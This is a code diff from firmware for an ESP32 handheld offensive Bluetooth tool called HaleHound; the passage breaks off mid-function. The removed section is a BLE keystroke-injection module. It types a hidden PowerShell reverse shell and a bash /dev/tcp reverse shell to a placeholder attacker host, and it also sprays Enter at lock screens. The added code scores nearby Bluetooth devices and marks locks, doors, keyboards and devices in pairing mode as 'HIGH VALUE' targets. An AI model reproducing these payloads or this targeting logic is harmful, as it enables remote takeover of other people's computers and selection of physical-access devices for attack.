@@ -8842,429 +8842,10 @@ void cleanup() {
 // Library: T-vK/ESP32-BLE-Keyboard v0.3.2
 // ═══════════════════════════════════════════════════════════════════════════
 
-#include <BleKeyboard.h>
-
-namespace BleDucky {
-
-// ── Payload definitions ───────────────────────────────────────────────────
-enum BdPayloadType {
-    BD_REVSHELL_PS = 0,    // PowerShell reverse shell (Win+R)
-    BD_REVSHELL_BASH,      // Bash reverse shell (Ctrl+Alt+T)
-    BD_LOCKSCREEN,         // Lock screen credential spray
-    BD_RICKROLL,           // Rick Roll (opens browser — CTF/demo)
-    BD_CUSTOM_STRING,      // User text
-    BD_PAYLOAD_COUNT       // 5
-};
-
-static const char* const BD_PAYLOAD_NAMES[] = {
-    "RevShell PS",
-    "RevShell Bash",
-    "Lock Bypass",
-    "Rick Roll",
-    "Custom Text"
-};
-
-// Payload strings (PROGMEM)
-static const char BD_PS_CMD[] PROGMEM =
-    "powershell -NoP -W Hidden -Exec Bypass -C "
-    "\"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
-    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
-    "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
-    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
-    "$r=(iex $d 2>&1|Out-String);"
-    "$t=[text.encoding]::ASCII.GetBytes($r);"
-    "$s.Write($t,0,$t.Length)}\"";
-
-static const char BD_BASH_CMD[] PROGMEM =
-    "bash -i >& /dev/tcp/LHOST/LPORT 0>&1";
-
-static const char BD_RICKROLL_URL[] PROGMEM =
-    "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-
-// ── State ─────────────────────────────────────────────────────────────────
-struct BdState {
-    int     selectedPayload;
-    bool    injecting;
-    bool    connected;
-    int     keystrokesTotal;
-    int     keystrokesSent;
-    char    customString[256];
-    int     customLen;
-};
-
-static BdState* bd = nullptr;
-static BleKeyboard* bleKb = nullptr;
-static bool bdExitRequested = false;
-static bool bdUiDrawn = false;
-static unsigned long bdLastDisplay = 0;
-static bool bdBleInitialized = false;
-
-// Dirty-flag redraw — only repaint when state changes
-static bool    bdPrevConnected = false;
-static bool    bdDirty = true;
-
-// ── Icon bar ──────────────────────────────────────────────────────────────
-#define BD_ICON_NUM 3
-static const int bdIconX[BD_ICON_NUM] = {SCALE_X(130), SCALE_X(170), 10};
-static const unsigned char* const bdIcons[BD_ICON_NUM] = {
-    bitmap_icon_start,     // Inject / Stop
-    bitmap_icon_RIGHT,     // Next payload
-    bitmap_icon_go_back    // Back
-};
-
-static void drawBdIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
-    for (int i = 0; i < BD_ICON_NUM; i++) {
-        tft.drawBitmap(bdIconX[i], ICON_BAR_Y, bdIcons[i], 16, 16, HALEHOUND_MAGENTA);
-    }
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
-}
-
-// ── Inject a single payload string via BLE keyboard ───────────────────────
-static void injectPayload() {
-    if (!bd || !bleKb || !bleKb->isConnected()) return;
-
-    char payloadBuf[256];
-    const char* payload = nullptr;
-
-    switch (bd->selectedPayload) {
-        case BD_REVSHELL_PS:
-            // Win+R to open Run dialog
-            bleKb->press(KEY_LEFT_GUI);
-            bleKb->press('r');
-            delay(30);
-            bleKb->release('r');
-            delay(10);
-            bleKb->release(KEY_LEFT_GUI);
-            delay(700);
-            strncpy_P(payloadBuf, BD_PS_CMD, sizeof(payloadBuf) - 1);
-            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
-            payload = payloadBuf;
-            break;
-
-        case BD_REVSHELL_BASH:
-            // Ctrl+Alt+T to open terminal
-            bleKb->press(KEY_LEFT_CTRL);
-            bleKb->press(KEY_LEFT_ALT);
-            bleKb->press('t');
-            delay(30);
-            bleKb->release('t');
-            delay(10);
-            bleKb->release(KEY_LEFT_ALT);
-            bleKb->release(KEY_LEFT_CTRL);
-            delay(900);
-            strncpy_P(payloadBuf, BD_BASH_CMD, sizeof(payloadBuf) - 1);
-            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
-            payload = payloadBuf;
-            break;
-
-        case BD_LOCKSCREEN:
-            // Rapid Enter presses (attempts blank/common passwords)
-            bd->keystrokesTotal = 10;
-            for (int i = 0; i < 10 && bd->injecting; i++) {
-                bleKb->write(KEY_RETURN);
-                delay(200);
-                bd->keystrokesSent = i + 1;
-            }
-            return;
-
-        case BD_RICKROLL:
-            // Win+R → browser URL
-            bleKb->press(KEY_LEFT_GUI);
-            bleKb->press('r');
-            delay(30);
-            bleKb->release('r');
-            delay(10);
-            bleKb->release(KEY_LEFT_GUI);
-            delay(700);
-            strncpy_P(payloadBuf, BD_RICKROLL_URL, sizeof(payloadBuf) - 1);
-            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
-            payload = payloadBuf;
-            break;
-
-        case BD_CUSTOM_STRING:
-            payload = bd->customString;
-            break;
-
-        default:
-            payload = "echo HaleHound";
-            break;
-    }
-
-    if (!payload) return;
-
-    bd->keystrokesTotal = strlen(payload);
-    bd->keystrokesSent = 0;
-
-    // Type the payload character by character
-    for (int i = 0; payload[i] && bd->injecting; i++) {
-        if (!bleKb->isConnected()) {
-            bd->connected = false;
-            break;
-        }
-        bleKb->write((uint8_t)payload[i]);
-        bd->keystrokesSent = i + 1;
-        delay(50);  // 50ms between keystrokes (BLE is slower than NRF24)
-    }
-
-    // Press Enter to execute
-    if (bd->injecting && bleKb->isConnected()) {
-        delay(50);
-        bleKb->write(KEY_RETURN);
-    }
-
-    bd->injecting = false;
-}
-
-// ── Draw main UI ──────────────────────────────────────────────────────────
-static void drawBdDisplay() {
-    int y = CONTENT_Y_START + 4;
-
-    tft.fillRect(0, y, SCREEN_WIDTH, SCREEN_HEIGHT - y, TFT_BLACK);
-
-    // Connection status
-    tft.setTextSize(1);
-    tft.setCursor(10, y);
-    if (bd->connected) {
-        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
-        tft.print("CONNECTED");
-    } else {
-        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
-        tft.print("WAITING FOR PAIR...");
-    }
-    y += 14;
-
-    // Device name
-    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
-    tft.setCursor(10, y);
-    tft.print("Name: HaleHound KB");
-    y += 14;
-
-    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
-    y += 6;
-
-    // Payload selector
-    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
-    tft.setCursor(10, y);
-    tft.print("PAYLOAD:");
-    y += 12;
-
-    for (int i = 0; i < BD_PAYLOAD_COUNT; i++) {
-        tft.setCursor(20, y);
-        if (i == bd->selectedPayload) {
-            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
-            tft.print("> ");
-        } else {
-            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-            tft.print("  ");
-        }
-        tft.print(BD_PAYLOAD_NAMES[i]);
-        y += 12;
-    }
-
-    y += 6;
-    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
-    y += 6;
-
-    // Injection status
-    if (bd->injecting) {
-        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.print("INJECTING...");
-        y += 14;
-
-        // Progress bar
-        int barX = 10;
-        int barW = SCREEN_WIDTH - 20;
-        int barH = SCALE_H(14);
-        tft.drawRect(barX, y, barW, barH, HALEHOUND_MAGENTA);
-        int progress = 0;
-        if (bd->keystrokesTotal > 0) {
-            progress = (bd->keystrokesSent * (barW - 2)) / bd->keystrokesTotal;
-        }
-        tft.fillRect(barX + 1, y + 1, progress, barH - 2, HALEHOUND_HOTPINK);
-        y += barH + 6;
-
-        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.printf("SENT: %d/%d", bd->keystrokesSent, bd->keystrokesTotal);
-    } else if (bd->keystrokesSent > 0) {
-        tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.print("INJECTION COMPLETE");
-        y += 14;
-        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.printf("SENT: %d keystrokes", bd->keystrokesSent);
-    } else if (!bd->connected) {
-        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.print("Pair a device to begin");
-    } else {
-        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
-        tft.setCursor(10, y);
-        tft.print("READY - Press START to inject");
-    }
-}
-
-// ── Setup ─────────────────────────────────────────────────────────────────
-void setup() {
-    bdExitRequested = false;
-    bdUiDrawn = false;
-    bdLastDisplay = 0;
-    bdBleInitialized = false;
-    bdPrevConnected = false;
-    bdDirty = true;
-
-    // Allocate state
-    if (bd) { free(bd); bd = nullptr; }
-    bd = (BdState*)calloc(1, sizeof(BdState));
-    if (!bd) {
-        tft.fillScreen(TFT_BLACK);
-        drawCenteredText(120, "HEAP ALLOC FAILED", HALEHOUND_HOTPINK, 2);
-        return;
-    }
-    bd->selectedPayload = BD_RICKROLL;  // Default to safe demo payload
-
-    tft.fillScreen(HALEHOUND_BLACK);
-    drawStatusBar();
-
-    drawGlitchText(SCALE_Y(55), "BLE DUCKY", &Nosifer_Regular10pt7b);
-
-    drawBdIconBar();
-
-    // Stop WiFi to free radio for BLE
-    esp_wifi_stop();
-    delay(100);
-
-    // Release Classic BT memory (MANDATORY per MEMORY.md)
-    releaseClassicBtMemory();
-
-    // Initialize BLE Keyboard
-    // ESP32-BLE-Keyboard calls BLEDevice::init() internally in begin()
-    if (bleKb) { delete bleKb; bleKb = nullptr; }
-    bleKb = new BleKeyboard("HaleHound KB", "HaleHound", 100);
-    bleKb->begin();
-    delay(150);  // Settle time before TX power set
-
-    // Max BLE TX power
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-
-    bdBleInitialized = true;
-    drawBdDisplay();
-    bdUiDrawn = true;
-
-    #if CYD_DEBUG
-    Serial.println("[BLE_DUCKY] Setup complete, advertising as 'HaleHound KB'");
-    Serial.printf("[BLE_DUCKY] Free heap: %u\n", ESP.getFreeHeap());
-    #endif
-}
-
-// ── Loop ──────────────────────────────────────────────────────────────────
-void loop() {
-    if (!bdUiDrawn) {
-        touchButtonsUpdate();
-        uint16_t tx, ty;
-        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
-            bdExitRequested = true;
-        }
-        return;
-    }
-
-    touchButtonsUpdate();
-
-    // Update connection state
-    if (bleKb) {
-        bool wasConnected = bd->connected;
-        bd->connected = bleKb->isConnected();
-        if (bd->connected != wasConnected) {
-            // Connection state changed — force redraw
-            bdDirty = true;
-            #if CYD_DEBUG
-            Serial.printf("[BLE_DUCKY] %s\n", bd->connected ? "DEVICE CONNECTED" : "DEVICE DISCONNECTED");
-            #endif
-        }
-    }
-
-    uint16_t tx, ty;
-    if (getTouchPoint(&tx, &ty)) {
-        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
-            // Back
-            if (tx < 40) {
-                bdExitRequested = true;
-                return;
-            }
-            // Inject / Stop
-            if (tx >= bdIconX[0] - 10 && tx < bdIconX[0] + 25) {
-                waitForTouchRelease();
-                delay(200);
-                if (bd->injecting) {
-                    bd->injecting = false;
-                } else if (bd->connected) {
-                    bd->injecting = true;
-                    bd->keystrokesSent = 0;
-                    bd->keystrokesTotal = 0;
-                    bdDirty = true;
-                    drawBdDisplay();
-                    injectPayload();  // Runs on Core 1 (BLE lib handles its own tasks)
-                }
-                return;
-            }
-            // Next payload
-            if (tx >= bdIconX[1] - 10 && tx < bdIconX[1] + 25) {
-                waitForTouchRelease();
-                delay(200);
-                bd->selectedPayload = (bd->selectedPayload + 1) % BD_PAYLOAD_COUNT;
-                bdDirty = true;
-                return;
-            }
-        }
-    }
-
-    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
-        bdExitRequested = true;
-        return;
-    }
-
-    // Only redraw when state actually changes — prevents screen flash
-    if (bdDirty && millis() - bdLastDisplay >= 100) {
-        drawBdDisplay();
-        bdLastDisplay = millis();
-        bdDirty = false;
-    }
-}
-
-bool isExitRequested() {
-    return bdExitRequested;
-}
-
-void cleanup() {
-    bd->injecting = false;
-
-    if (bleKb) {
-        bleKb->end();
-        delete bleKb;
-        bleKb = nullptr;
-    }
-
-    // Deinit BLE — use deinit(false) per MEMORY.md (deinit(true) is broken)
-    if (bdBleInitialized) {
-        BLEDevice::deinit(false);
-        bdBleInitialized = false;
-    }
-
-    if (bd) { free(bd); bd = nullptr; }
-    bdExitRequested = false;
-    bdUiDrawn = false;
-
-    #if CYD_DEBUG
-    Serial.println("[BLE_DUCKY] Cleanup complete");
-    #endif
-}
-
-}  // namespace BleDucky
+// BLE Ducky removed — T-vK/ESP32-BLE-Keyboard library is abandoned (240+ open
+// issues, broken Windows reconnect, requires target to manually pair).  BLE HID
+// keystroke injection is fundamentally inferior to USB HID (Rubber Ducky, Bash
+// Bunny) because it cannot operate without user-initiated pairing on the target.
 
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -9308,9 +8889,10 @@ enum PredFilter : uint8_t {
     PF_ALL = 0,
     PF_NAMED,
     PF_STRONG,
+    PF_HIGH,
     PF_COUNT
 };
-static const char* pfNames[] = {"ALL", "NAMED", "STRONG"};
+static const char* pfNames[] = {"ALL", "NAMED", "STRONG", "HIGH"};
 
 // ── Replay mode ───────────────────────────────────────────────────────────
 
@@ -9389,6 +8971,7 @@ struct ReconDevice {
     bool     hasName;
     bool     randomMAC;
     bool     selected;
+    uint8_t  tier;            // DeviceTier: 0=YELLOW, 1=RED, 2=SKIP
 };
 
 // ── Heap-allocated state ──────────────────────────────────────────────────
@@ -9612,19 +9195,171 @@ static const char* bpDevLabel(uint16_t companyId, bool hasName) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
+// TARGET SCORING — ADV PARSER + CLASSIFICATION
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Parsed advertising payload fields (13 bytes stack, zero heap)
+struct AdvParsed {
+    uint16_t svcUUIDs[4];     // Up to 4 16-bit service UUIDs
+    uint16_t appearance;       // GAP appearance value (0xFFFF = absent)
+    uint8_t  svcCount;         // How many UUIDs found
+    uint8_t  flags;            // AD type 0x01 flags byte
+    bool     hasFlags;
+};
+
+// Parse raw ADV payload TLV structure
+static void bpParseAdvPayload(const uint8_t* payload, uint8_t len, AdvParsed* out) {
+    out->svcCount = 0;
+    out->appearance = 0xFFFF;
+    out->flags = 0;
+    out->hasFlags = false;
+
+    uint8_t pos = 0;
+    while (pos < len) {
+        uint8_t adLen = payload[pos];
+        if (adLen == 0 || pos + adLen >= len) break;
+        uint8_t adType = payload[pos + 1];
+        const uint8_t* data = &payload[pos + 2];
+        uint8_t dataLen = adLen - 1;
+
+        switch (adType) {
+            case 0x01:  // Flags
+                if (dataLen >= 1) {
+                    out->flags = data[0];
+                    out->hasFlags = true;
+                }
+                break;
+            case 0x02:  // Incomplete 16-bit service UUIDs
+            case 0x03:  // Complete 16-bit service UUIDs
+                for (uint8_t i = 0; i + 1 < dataLen && out->svcCount < 4; i += 2) {
+                    out->svcUUIDs[out->svcCount++] = data[i] | (data[i + 1] << 8);
+                }
+                break;
+            case 0x19:  // Appearance
+                if (dataLen >= 2) {
+                    out->appearance = data[0] | (data[1] << 8);
+                }
+                break;
+        }
+        pos += adLen + 1;
+    }
+}
+
+// WHAT column label: appearance detail > company name > "Named" > "???"
+static const char* bpDevWhat(ReconDevice* d) {
+    AdvParsed adv;
+    bpParseAdvPayload(d->payload, d->payloadLen, &adv);
+    if (adv.appearance != 0xFFFF) {
+        const char* detail = lookupAppearanceDetail(adv.appearance);
+        if (detail) return detail;
+    }
+    if (d->companyId != 0xFFFF) {
+        const char* co = lookupCompanyName(d->companyId);
+        if (co) return co;
+    }
+    return d->hasName ? "Named" : "???";
+}
+
+// Case-insensitive substring search (no stdlib dependency)
+static bool bpNameContains(const char* name, const char* sub) {
+    if (!name[0] || !sub[0]) return false;
+    int nLen = strlen(name);
+    int sLen = strlen(sub);
+    if (sLen > nLen) return false;
+    for (int i = 0; i <= nLen - sLen; i++) {
+        bool match = true;
+        for (int j = 0; j < sLen; j++) {
+            char a = name[i + j];
+            char b = sub[j];
+            if (a >= 'A' && a <= 'Z') a += 32;
+            if (b >= 'A' && b <= 'Z') b += 32;
+            if (a != b) { match = false; break; }
+        }
+        if (match) return true;
+    }
+    return false;
+}
+
+// Classify device into RED / SKIP / YELLOW tier
+static uint8_t bpClassifyDevice(ReconDevice* d) {
+    AdvParsed adv;
+    bpParseAdvPayload(d->payload, d->payloadLen, &adv);
+
+    // ── Priority 1-3: RED by service UUID, appearance, company ID ────────
+    for (uint8_t i = 0; i < adv.svcCount; i++) {
+        if (inProgmemU16List(adv.svcUUIDs[i], redServiceUUIDs, RED_SVC_COUNT))
+            return TIER_RED;
+    }
+    if (adv.appearance != 0xFFFF) {
+        if (inProgmemU16List(adv.appearance, redAppearances, RED_APP_COUNT))
+            return TIER_RED;
+    }
+    if (d->companyId != 0xFFFF) {
+        if (inProgmemU16List(d->companyId, redCompanyIDs, RED_CID_COUNT))
+            return TIER_RED;
+    }
+
+    // ── Priority 4: RED by device name patterns ──────────────────────────
+    if (d->hasName) {
+        static const char* redNames[] = {
+            "lock", "safe", "door", "key", "access",
+            "keyboard", "provision", "gateway"
+        };
+        for (int i = 0; i < 8; i++) {
+            if (bpNameContains(d->name, redNames[i])) return TIER_RED;
+        }
+    }
+
+    // ── Priority 5: RED if in pairing mode (LE Limited Discoverable) ─────
+    if (adv.hasFlags && (adv.flags & 0x01)) return TIER_RED;
+
+    // ── Priority 6-8: SKIP by service UUID, appearance, company ID ───────
+    for (uint8_t i = 0; i < adv.svcCount; i++) {
+        if (inProgmemU16List(adv.svcUUIDs[i], skipServiceUUIDs, SKIP_SVC_COUNT))
+            return TIER_SKIP;
+    }
+    if (adv.appearance != 0xFFFF) {
+        if (inProgmemU16List(adv.appearance, skipAppearances, SKIP_APP_COUNT))
+            return TIER_SKIP;
+    }
+    if (d->companyId != 0xFFFF) {
+        if (inProgmemU16List(d->companyId, skipCompanyIDs, SKIP_CID_COUNT))
+            return TIER_SKIP;
+    }
+
+    // ── Priority 9: SKIP by device name patterns ─────────────────────────
+    if (d->hasName) {
+        static const char* skipNames[] = {
+            "buds", "pods", "airpod", "speaker", "soundbar",
+            "headphone", "earbud", "band", "watch", "fitbit",
+            "garmin", "polar", "oura", "beacon", "tile",
+            "tag", "gamepad", "controller", "joycon"
+        };
+        for (int i = 0; i < 19; i++) {
+            if (bpNameContains(d->name, skipNames[i])) return TIER_SKIP;
+        }
+    }
+
+    // ── Priority 10: Default yellow ──────────────────────────────────────
+    return TIER_YELLOW;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
 // FILTER
 // ═══════════════════════════════════════════════════════════════════════════
 
 static bool bpPassesFilter(ReconDevice* d) {
+    // SKIP-tier devices are ALWAYS hidden regardless of filter mode
+    if (d->tier == TIER_SKIP) return false;
     switch (S->filter) {
         case PF_NAMED:  return d->hasName;
         case PF_STRONG: return d->rssi > -60;
+        case PF_HIGH:   return d->tier == TIER_RED;
         default:        return true;
     }
 }
 
 static int bpCountFiltered() {
-    if (S->filter == PF_ALL) return S->deviceCount;
     int count = 0;
     for (int i = 0; i < S->deviceCount; i++) {
         if (bpPassesFilter(&S->devices[i])) count++;
@@ -9669,15 +9404,18 @@ static void bpAddOrUpdate(uint8_t* mac, uint8_t addrType, int8_t rssi,
         if (rssi > d->rssiMax) d->rssiMax = rssi;
         d->lastSeen = now;
         d->frameCount++;
+        bool dataChanged = false;
         if (hasName && !d->hasName) {
             strncpy(d->name, name, 16);
             d->name[16] = '\0';
             d->hasName = true;
+            dataChanged = true;
         }
         // Update payload if better data
         if (payloadLen > d->payloadLen) {
             memcpy(d->payload, payload, payloadLen);
             d->payloadLen = payloadLen;
+            dataChanged = true;
         }
         if (mfgLen > 0 && d->mfgDataLen == 0) {
             uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
@@ -9685,6 +9423,11 @@ static void bpAddOrUpdate(uint8_t* mac, uint8_t addrType, int8_t rssi,
             d->mfgDataLen = copyLen;
             uint16_t cid = bpExtractCompanyId(mfgData, mfgLen);
             if (cid != 0xFFFF) d->companyId = cid;
+            dataChanged = true;
+        }
+        // Re-classify if new data could change tier
+        if (dataChanged && d->tier == TIER_YELLOW) {
+            d->tier = bpClassifyDevice(d);
         }
         return;
     }
@@ -9735,11 +9478,14 @@ static void bpAddOrUpdate(uint8_t* mac, uint8_t addrType, int8_t rssi,
     }
 
     S->deviceCount++;
+    d->tier = bpClassifyDevice(d);
 
     #if CYD_DEBUG
-    Serial.printf("[PREDATOR] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s pld:%d\n",
+    static const char* tierTags[] = {"YEL", "RED", "SKIP"};
+    Serial.printf("[PREDATOR] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s pld:%d [%s]\n",
                   S->deviceCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
-                  rssi, bpDevLabel(d->companyId, d->hasName), d->payloadLen);
+                  rssi, bpDevLabel(d->companyId, d->hasName), d->payloadLen,
+                  tierTags[d->tier]);
     #endif
 }
 
@@ -11337,12 +11083,10 @@ static void drawColumnHeaders() {
     tft.setTextColor(HALEHOUND_MAGENTA);
     tft.setCursor(SCALE_X(5), SCALE_Y(60));
     tft.print("RSSI");
-    tft.setCursor(SCALE_X(40), SCALE_Y(60));
-    tft.print("MAC");
-    tft.setCursor(SCALE_X(110), SCALE_Y(60));
-    tft.print("TYPE");
-    tft.setCursor(SCALE_X(185), SCALE_Y(60));
-    tft.print("#");
+    tft.setCursor(SCALE_X(28), SCALE_Y(60));
+    tft.print("DEVICE");
+    tft.setCursor(SCALE_X(145), SCALE_Y(60));
+    tft.print("WHAT");
 }
 
 static void drawDeviceList() {
@@ -11384,12 +11128,14 @@ static void drawDeviceList() {
             tft.fillRect(0, y, SCREEN_WIDTH, BP_ITEM_HEIGHT - 2, HALEHOUND_DARK);
         }
 
-        // Color coding
+        // Color coding (tier-aware)
         uint16_t rowColor;
         if (isCurrent) {
             rowColor = HALEHOUND_BRIGHT;
         } else if (d->selected) {
             rowColor = HALEHOUND_HOTPINK;
+        } else if (d->tier == TIER_RED) {
+            rowColor = TFT_RED;
         } else if (age < 5000 && d->hasName) {
             rowColor = TFT_WHITE;
         } else if (age < 5000) {
@@ -11415,23 +11161,34 @@ static void drawDeviceList() {
         // RSSI bar
         bpDrawRssiBar(SCALE_X(5), y + 1, d->rssi);
 
-        // Short MAC (last 3 octets)
-        tft.setCursor(SCALE_X(30), y + SCALE_H(4));
-        char shortMac[10];
-        snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
-                 d->mac[3], d->mac[4], d->mac[5]);
-        tft.print(shortMac);
-
-        // Type label
-        tft.setCursor(SCALE_X(85), y + SCALE_H(4));
-        tft.print(bpDevLabel(d->companyId, d->hasName));
-
-        // Frame count
-        tft.setCursor(SCALE_X(175), y + SCALE_H(4));
-        if (d->frameCount > 999) {
-            tft.printf("%dk", d->frameCount / 1000);
+        // DEVICE column: name or short MAC
+        tft.setCursor(SCALE_X(28), y + SCALE_H(4));
+        if (d->hasName && d->name[0]) {
+            char trunc[19];
+            strncpy(trunc, d->name, 18);
+            trunc[18] = '\0';
+            tft.print(trunc);
         } else {
-            tft.printf("%d", d->frameCount);
+            char shortMac[10];
+            snprintf(shortMac, sizeof(shortMac), "%02X:%02X:%02X",
+                     d->mac[3], d->mac[4], d->mac[5]);
+            tft.print(shortMac);
+        }
+
+        // WHAT column: appearance > company > "Named" > "???"
+        tft.setCursor(SCALE_X(145), y + SCALE_H(4));
+        const char* what = bpDevWhat(d);
+        char whatTrunc[14];
+        strncpy(whatTrunc, what, 13);
+        whatTrunc[13] = '\0';
+        tft.print(whatTrunc);
+
+        // RED tier marker
+        if (d->tier == TIER_RED) {
+            tft.setTextColor(TFT_RED, bgColor);
+            tft.setCursor(SCALE_X(230), y + SCALE_H(4));
+            tft.print("!");
+            tft.setTextColor(rowColor, bgColor);
         }
 
         // Active dot
@@ -11443,24 +11200,50 @@ static void drawDeviceList() {
         drawn++;
     }
 
-    // Stats line
+    // Stats line — tier counts
     int statsY = SCALE_Y(280);
     tft.fillRect(0, statsY, SCREEN_WIDTH, SCALE_H(14), HALEHOUND_BLACK);
     tft.setTextSize(1);
-    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    int redCnt = 0, yelCnt = 0;
+    for (int i = 0; i < S->deviceCount; i++) {
+        if (S->devices[i].tier == TIER_RED)    redCnt++;
+        else if (S->devices[i].tier == TIER_YELLOW) yelCnt++;
+    }
+    tft.setTextColor(TFT_RED, HALEHOUND_BLACK);
     tft.setCursor(5, statsY + 1);
-    uint32_t elapsed = (millis() - S->scanStartTime) / 1000;
-    tft.printf("T:%d  Dwell:%dms", S->deviceCount, S->replayDwellMs);
+    tft.printf("RED:%d", redCnt);
+    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(55), statsY + 1);
+    tft.printf("YEL:%d", yelCnt);
     tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(110), statsY + 1);
+    tft.printf("Total:%d", redCnt + yelCnt);
     tft.setCursor(SCALE_X(180), statsY + 1);
+    uint32_t elapsed = (millis() - S->scanStartTime) / 1000;
     tft.printf("%02d:%02d", (int)(elapsed / 60), (int)(elapsed % 60));
 
-    // Footer hint
+    // Footer — page indicator + hint
     int footY = SCALE_Y(295);
     tft.fillRect(0, footY, SCREEN_WIDTH, SCALE_H(25), HALEHOUND_GUNMETAL);
     tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
-    tft.setCursor(SCALE_X(5), footY + SCALE_H(8));
-    tft.print("TAP=Target  LONG=Select");
+    int filtered = bpCountFiltered();
+    int totalPages = (filtered + BP_MAX_VISIBLE - 1) / BP_MAX_VISIBLE;
+    if (totalPages < 1) totalPages = 1;
+    int curPage = (S->listStartIndex / BP_MAX_VISIBLE) + 1;
+    if (totalPages > 1) {
+        // Show page nav: < 2/7 >   TAP=Target
+        tft.setCursor(SCALE_X(5), footY + SCALE_H(8));
+        tft.print("<");
+        tft.setCursor(SCALE_X(18), footY + SCALE_H(8));
+        tft.printf("%d/%d", curPage, totalPages);
+        tft.setCursor(SCALE_X(55), footY + SCALE_H(8));
+        tft.print(">");
+        tft.setCursor(SCALE_X(80), footY + SCALE_H(8));
+        tft.print("TAP=Target LONG=Sel");
+    } else {
+        tft.setCursor(SCALE_X(5), footY + SCALE_H(8));
+        tft.print("TAP=Target  LONG=Select");
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -11492,6 +11275,14 @@ static void drawTargetOverlay() {
     tft.setCursor(SCALE_X(75), y);
     tft.print(">> TARGET <<");
     y += lineH + 2;
+
+    // Tier badge
+    if (d->tier == TIER_RED) {
+        tft.setTextColor(TFT_RED);
+        tft.setCursor(SCALE_X(68), y);
+        tft.print("[HIGH VALUE]");
+        y += lineH;
+    }
 
     // Name
     tft.setTextColor(HALEHOUND_HOTPINK);
@@ -12257,12 +12048,13 @@ namespace FlockYou {
 #define FY_MAX_DEVICES      24
 #define FY_SCAN_DURATION     3     // Seconds per scan cycle
 #define FY_UI_REFRESH_MS   250     // UI update throttle
-#define FY_MAX_VISIBLE       8     // Visible list rows on 320px screen
+#define FY_MAX_VISIBLE       7     // Visible list rows (7×28=196px, ends y=286, above buttons at y=292)
 #define FY_ALERT_DURATION 2000     // Alert flash duration (ms)
 #define FY_ICON_SIZE        16     // Bitmap icon dimension
 #define FY_LINE_HEIGHT      28     // Pixels per list row
 #define FY_LIST_START_Y     98     // Y start for device list (below stats)
 #define FY_RESCAN_DELAY    100     // ms yield between scan cycles
+#define FY_STALE_TIMEOUT 30000     // Remove devices not seen in 30 seconds
 
 // ═══════════════════════════════════════════════════════════════════════════
 // DEVICE TYPES AND MATCH FLAGS
@@ -12509,6 +12301,34 @@ static int fyFindDevice(const uint8_t* mac) {
     return -1;
 }
 
+static void fyPruneStaleDevices() {
+    uint32_t now = millis();
+    int i = 0;
+    while (i < fyDeviceCount) {
+        if (now - fyDevices[i].lastSeen > FY_STALE_TIMEOUT) {
+            Serial.printf("[FLOCK] EXPIRED: %02X:%02X:%02X:%02X:%02X:%02X (no seen %lus)\n",
+                          fyDevices[i].mac[0], fyDevices[i].mac[1], fyDevices[i].mac[2],
+                          fyDevices[i].mac[3], fyDevices[i].mac[4], fyDevices[i].mac[5],
+                          (unsigned long)(now - fyDevices[i].lastSeen) / 1000);
+            // Shift remaining devices down
+            for (int j = i; j < fyDeviceCount - 1; j++) {
+                fyDevices[j] = fyDevices[j + 1];
+            }
+            fyDeviceCount--;
+            // Fix selection index
+            if (fySelectedIdx >= fyDeviceCount && fyDeviceCount > 0) {
